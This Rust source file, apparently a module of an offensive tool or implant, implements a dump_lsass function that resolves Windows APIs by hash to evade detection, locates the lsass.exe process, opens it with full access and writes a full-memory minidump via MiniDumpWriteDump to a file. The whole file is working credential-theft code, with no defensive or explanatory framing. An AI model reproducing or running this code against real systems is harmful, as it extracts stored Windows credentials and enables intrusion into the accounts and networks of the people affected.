#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::*;
#[cfg(target_os = "windows")]
use core::ffi::c_void;

pub struct Credentials;

impl Credentials {
    pub fn dump_lsass(&self, target_path: &str) -> Result<(), ()> {
        #[cfg(target_os = "windows")]
        unsafe {
            let kernel32 = hash_str(b"kernel32.dll");
            let create_snapshot = resolve_function(kernel32, hash_str(b"CreateToolhelp32Snapshot"));
            let process_first = resolve_function(kernel32, hash_str(b"Process32First"));
            let process_next = resolve_function(kernel32, hash_str(b"Process32Next"));
            let open_process = resolve_function(kernel32, hash_str(b"OpenProcess"));
            let create_file = resolve_function(kernel32, hash_str(b"CreateFileA"));
            let close_handle = resolve_function(kernel32, hash_str(b"CloseHandle"));
            let load_library = resolve_function(kernel32, hash_str(b"LoadLibraryA"));

            if create_snapshot.is_null() || process_first.is_null() || open_process.is_null() || load_library.is_null() {
                return Err(());
            }

            type FnCreateSnapshot = unsafe extern "system" fn(u32, u32) -> HANDLE;
            type FnProcessNext = unsafe extern "system" fn(HANDLE, *mut PROCESSENTRY32) -> i32;
            type FnOpenProcess = unsafe extern "system" fn(u32, i32, u32) -> HANDLE;
            type FnCreateFileA = unsafe extern "system" fn(*const u8, u32, u32, *mut c_void, u32, u32, HANDLE) -> HANDLE;
            type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;
            type FnLoadLibraryA = unsafe extern "system" fn(*const u8) -> HANDLE;

            // 1. Find LSASS PID
            // TH32CS_SNAPPROCESS = 0x2
            let h_snapshot = core::mem::transmute::<_, FnCreateSnapshot>(create_snapshot)(0x2, 0);
            if h_snapshot == (-1isize as HANDLE) { return Err(()); }

            let mut pe: PROCESSENTRY32 = core::mem::zeroed();
            pe.dwSize = core::mem::size_of::<PROCESSENTRY32>() as u32;

            let mut lsass_pid = 0;
            if core::mem::transmute::<_, FnProcessNext>(process_first)(h_snapshot, &mut pe) != 0 {
                loop {
                    // Check for lsass.exe
                    let mut is_lsass = true;
                    let target = b"lsass.exe";
                    for i in 0..target.len() {
                        let mut c = pe.szExeFile[i];
                        if c >= b'A' && c <= b'Z' { c += 32; } // to_lower
                        if c != target[i] {
                            is_lsass = false;
                            break;
                        }
                    }
                    if is_lsass {
                        lsass_pid = pe.th32ProcessID;
                        break;
                    }
                    if core::mem::transmute::<_, FnProcessNext>(process_next)(h_snapshot, &mut pe) == 0 {
                        break;
                    }
                }
            }
            core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_snapshot);

            if lsass_pid == 0 { return Err(()); }

            // 2. Open LSASS
            // PROCESS_ALL_ACCESS = 0x001F0FFF
            let h_process = core::mem::transmute::<_, FnOpenProcess>(open_process)(0x001F0FFF, 0, lsass_pid);
            if h_process.is_null() { return Err(()); }

            // 3. Create Dump File
            let mut path_c = alloc::vec::Vec::from(target_path.as_bytes()); path_c.push(0);
            let h_file = core::mem::transmute::<_, FnCreateFileA>(create_file)(
                path_c.as_ptr(),
                0x40000000, // GENERIC_WRITE
                0,
                core::ptr::null_mut(),
                2, // CREATE_ALWAYS
                0x80, // FILE_ATTRIBUTE_NORMAL
                core::ptr::null_mut()
            );

            if h_file == (-1isize as HANDLE) {
                core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_process);
                return Err(());
            }

            // 4. Load dbghelp.dll and call MiniDumpWriteDump
            let h_dbghelp = core::mem::transmute::<_, FnLoadLibraryA>(load_library)(b"dbghelp.dll\0".as_ptr());
            if h_dbghelp.is_null() {
                core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_file);
                core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_process);
                return Err(());
            }

            // Resolve MiniDumpWriteDump from dbghelp
            // Need a way to resolve from non-PEB modules? resolve_function walks PEB.
            // LoadLibrary adds to PEB.
            let minidump_write_dump_addr = resolve_function(hash_str(b"dbghelp.dll"), hash_str(b"MiniDumpWriteDump"));
            if minidump_write_dump_addr.is_null() {
                core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_file);
                core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_process);
                return Err(());
            }

            type FnMiniDumpWriteDump = unsafe extern "system" fn(HANDLE, u32, HANDLE, u32, PVOID, PVOID, PVOID) -> i32;
            
            // MiniDumpWithFullMemory = 0x00000002
            let success = core::mem::transmute::<_, FnMiniDumpWriteDump>(minidump_write_dump_addr)(
                h_process,
                lsass_pid,
                h_file,
                0x00000002,
                core::ptr::null_mut(),
                core::ptr::null_mut(),
                core::ptr::null_mut()
            );

            core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_file);
            core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_process);

            if success == 0 {
                return Err(());
            }
            Ok(())
        }

        #[cfg(not(target_os = "windows"))]
        {
            let _ = target_path;
            Err(())
        }
    }
}
